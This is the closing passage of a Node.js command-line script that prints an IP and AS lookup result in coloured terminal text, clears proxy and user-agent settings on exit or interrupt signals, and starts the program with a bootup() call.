   IP:       [ \x1b[1m\x1b[36m${result.query}\x1b[0m ]
   AS:       [ \x1b[1m\x1b[36m${result.as}\x1b[0m ]
    `);

    sigma();
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()